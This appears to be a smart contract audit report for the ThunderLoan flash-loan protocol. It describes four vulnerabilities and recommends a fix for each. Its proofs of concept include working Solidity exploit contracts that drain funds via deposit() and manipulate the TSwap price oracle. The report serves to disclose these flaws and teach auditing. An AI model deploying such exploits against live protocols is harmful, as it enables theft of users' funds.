
### [S-#] TITLE (Root Cause -> Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:**




### [H-1] Erroneous `ThunderLoan::updateExchangeRate` in the `deposit` function causes protocol to think it has more fees than it really does, which blocks redemption and incorrectly sets the exchange rate

**Description:** In the ThunderLoan system, the `exchangeRate` is responsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it's responsible for keeping track of how many fees to give to liquidity providers.

However, the `deposit` function, updates this rate, without coollecting any fees! 

```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        // @audit -high we should not be updating the exchange rate here!
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>      assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:** There are several impacts to this bug.

1. The `redeem` function is blocked, bacuse the protocol thinks the owed tokens is more than it has.
2. Rewards are incorrectly calculated, leading to liquidity providers potentially getting way more or less than deserved. 

**Proof of Concept:**

1. LP deposits
2. User takes out a flash loan
3. It is now impossible for LP to redeem.


<details>
<summary>Proof of Code</summary>

Place the following into `ThunderLoanTest.t.sol`
```javascript
  function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT); //fee
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

</details>

**Recommended Mitigation:** Remove the incorrect updated exchange rate lines from `deposit`.

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

        // @audit -high we should not be updating the exchange rate here!
-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```




### [H-2] All the funds can be stolen if the flash loan is returned using deposit()

**Description:** An attacker can acquire a flash loan and deposit funds directly into the contract using the `deposit()`, enabling stealing all the funds.

The `flashloan()` performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing `endingBalance` with `startingBalance + fee`. However, a vulnerability emerges when calculating `endingBalance` using `token.balanceOf(address(assetToken))`.

Exploiting this vulnerability, an attacker can return the flash loan using the `deposit()` instead of `repay()`. This action allows the attacker to mint `AssetToken` and subsequently redeem it using `redeem()`. What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.

**Impact:** All the funds of the AssetContract can be stolen.


**Proof of Concept:**
To execute the test successfully, please complete the following steps:

1. Place the attack.sol file within the mocks folder.
2. Import the contract in ThunderLoanTest.t.sol.
3. Add testattack() function in ThunderLoanTest.t.sol.
4. Change the setUp() function in ThunderLoanTest.t.sol.

<details> 
<summary>Proof Of Code</summary>

```javascript
        import { Attack } from "../mocks/attack.sol";
```

```javascript
        function testattack() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        vm.startPrank(user);
        tokenA.mint(address(attack), AMOUNT);
        thunderLoan.flashloan(address(attack), tokenA, amountToBorrow, "");
        attack.sendAssetToken(address(thunderLoan.getAssetFromToken(tokenA)));
        thunderLoan.redeem(tokenA, type(uint256).max);
        vm.stopPrank();

        assertLt(tokenA.balanceOf(address(thunderLoan.getAssetFromToken(tokenA))), DEPOSIT_AMOUNT);   
    }
```

```javascript
        function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
        vm.prank(user);
        attack = new Attack(address(thunderLoan));   
    }
```
attack.sol

```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";

interface IThunderLoan {
    function repay(address token, uint256 amount) external;
    function deposit(IERC20 token, uint256 amount) external;
    function getAssetFromToken(IERC20 token) external;
}


contract Attack {
    error MockFlashLoanReceiver__onlyOwner();
    error MockFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    constructor(address thunderLoan) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata /*  params */
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));
        
        if (initiator != s_owner) {
            revert MockFlashLoanReceiver__onlyOwner();
        }
        
        if (msg.sender != s_thunderLoan) {
            revert MockFlashLoanReceiver__onlyThunderLoan();
        }
        IERC20(token).approve(s_thunderLoan, amount + fee);
        IThunderLoan(s_thunderLoan).deposit(IERC20(token), amount + fee);
        s_balanceAfterFlashLoan = IERC20(token).balanceOf(address(this));
        return true;
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }

    function sendAssetToken(address assetToken) public {
        
        IERC20(assetToken).transfer(msg.sender, IERC20(assetToken).balanceOf(address(this)));
    }
}
```

</details>

**Recommended Mitigation:** Add a check in `deposit()` to make it impossible to use it in the same block of the flash loan. For example registring the block.number in a variable in `flashloan()` and checking it in `deposit()`.



### [H-3] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`, freezing protocol

**Description:** `ThunderLoan.sol` has two variables in the followong order: 


```java
        uint256 private s_feePrecision; 
        uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the upgraded contract `ThunderLoanUpgraded.sol` has them in a different order:


```java
        uint256 private s_flashLoanFee; // 0.3% ETH fee
        uint256 public constant FEE_PRECISION = 1e18;
```

Due to how solidity works after the upgrade the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the posotoon of storage variables, and removong storage variables for constant variables, breaks the storage locations as well. 

**Impact:** After the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take flash loans right after an upgrade will be charged the wrong fee.

More importantly , the `s_currentlyFlasLoaning` mapping with storage in the wrong storage slot. 

**Proof of Concept:**

<details>
<summary>PoC</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript

import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";
.
.
.
.
    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("Fee Before: ", feeBeforeUpgrade);
        console.log("Fee After: ", feeAfterUpgrade);
        
        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```

You can also see the layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`.

</details>


**Recommended Mitigation:** If you must remove the storage variable, leave it as blank as to not mess up the storage slots. 

```diff
-        uint256 private s_flashLoanFee; // 0.3% ETH fee
-        uint256 public constant FEE_PRECISION = 1e18;
+        uint256 private s_blank;
+        uint256 private s_flashLoanFee; // 0.3% ETH fee
+        uint256 public constant FEE_PRECISION = 1e18;
```







### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks.

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Bacause of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essencially ignorning protocol fees.

**Impact:** Liquidity providers will receive drastically reduces fees for providing liquidity.

**Proof of Concept:** 

The followong all happens in 1 transaction.

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `feeOne`. Durung the flash loan, they do the followong:
   1. User sells 1000 `tokenA`, tanking the price.
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`.
      1. Due to the fact that the way `ThunderLoan` calsulates price based on the `TSwapPool` this second flash loan is substantially cheaper.

```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
   3. The user then repays the first flash loan, and then repays the second flash loan.

<details>
<summary>Proof Of Code</summary>

Place the following into `ThunderLoanTest.t.sol`

```javascript
    function testOracleManipulation() public {
        //1. Setup contract
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create a TSwap Dex btw WETH and TokenA
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        //2. Fund TSwap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(tswapPool), 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(address(tswapPool), 100e18);
        // Deposit
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
        // Ratio 100 WETH & 100 TokenA
        // Price: 1:1

        // 3. Fund ThunderLoan
        // Set allow
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // Fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 100e18);
        vm.stopPrank();

        // 100 WETH & 100 TokenA in TSwap
        // 1000 TokenA in ThunderLoan
        // Take out a flash loan of 50 tokenA
        // Swap it on the dex, tanking the price> 150TokenA : ~80 WETH
        // Take out QANOTHER flash loan of 50 tokenA (and we'll see how much cheaper it is!!)

        // 4. We are going to take out 2 flash loans
        //      a. To nuke the price of the WETH/TokenA on TSwap
        //      b. To show that doing so greatly reduces the fees we pay on ThunderLoan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console.log("Normal fee is:", normalFeeCost);

        uint256 amountToBorrow = 50e18; // we gonna do this twice
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack Fee is: ", attackFee);
        assert(attackFee < normalFeeCost);
       
    }
```

```javascript

    contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    address repayAddress;
    BuffMockTSwap tswapPool;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    // 1. Swap TokenA borrowe for WETH
    // 2. Take out ANOTHER flash loan, to show the difference

    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
      }

      function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address /*initiator*/,
            bytes calldata /*params*/
      )

            external 
                returns (bool)
            {
                if(!attacked) {
                    // 1. Swap TokenA borrowe for WETH
                    // 2. Take out ANOTHER flash loan, to show the difference
                    feeOne = fee;
                    attacked = true;
                    uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                    IERC20(token).approve(address(tswapPool), 50e18);
                    // This will tank the price
                    tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);
                    // we call a second flashloan
                    thunderLoan.flashloan(address(this), IERC20(token), amount, "");
                    // repay
                    // IERC20(token).approve(address(thunderLoan), amount + fee);
                    // thunderLoan.repay(IERC20(token), amount + fee);
                    IERC20(token).transfer(address(repayAddress), amount + fee);
                }else {
                    // calculate the fee and repay
                    feeTwo = fee;
                    // repay
                    // IERC20(token).approve(address(thunderLoan), amount + fee);
                    // thunderLoan.repay(IERC20(token), amount + fee);
                    IERC20(token).transfer(address(repayAddress), amount + fee);
                }
                return true;                
            }
}
```

</details> 

**Recommended Mitigation:** Consider using a defferent price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle. 